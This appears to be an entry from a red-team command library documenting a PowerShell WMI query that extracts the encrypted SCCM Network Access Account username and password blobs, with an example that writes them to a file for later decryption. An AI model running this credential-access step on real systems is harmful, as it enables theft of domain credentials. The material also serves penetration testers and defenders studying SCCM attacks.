---
id: 04afa157-847f-4b7c-8c8a-d51fc2fdf369
name: Retrieve SCCM Network Access Account Blob
type: command
executor: powershell
data: >-
  Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class
  "CCM_NetworkAccessAccount"
output: null
created_at: '2023-04-06T03:56:08.224149+00:00'
updated_at: '2023-04-10T20:26:02.204187+00:00'
platforms:
  - Windows
tags:
  - sccm
  - wmi
  - credential-access
verified: true
validated: true
---

# Retrieve-SCCM-Network-Access-Account-Blob

## Command

```powershell
Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class "CCM_NetworkAccessAccount"
```

## Description

This PowerShell command queries the SCCM WMI namespace to retrieve the Network Access Account configuration, including encrypted username and password blobs. Run on an SCCM client machine to extract data for decryption.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-Namespace "root\ccm\policy\Machine\ActualConfig"` | WMI namespace for SCCM policies | Yes |
| `-Class "CCM_NetworkAccessAccount"` | WMI class containing NAA data | Yes |

## Examples

### Basic Usage

```powershell
Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class "CCM_NetworkAccessAccount"
```

### Output to File

```powershell
Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class "CCM_NetworkAccessAccount" | Out-File -FilePath naa_blob.txt
```

## Expected Output

```

NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
NetworkAccessUsername : <![CDATA[E600000001...00F92]]>

```

The CDATA sections contain the encrypted blobs; copy them for decryption tools.

## Related

- [[procedures/SCCM-Network-Access-Account-Credential-Theft]]
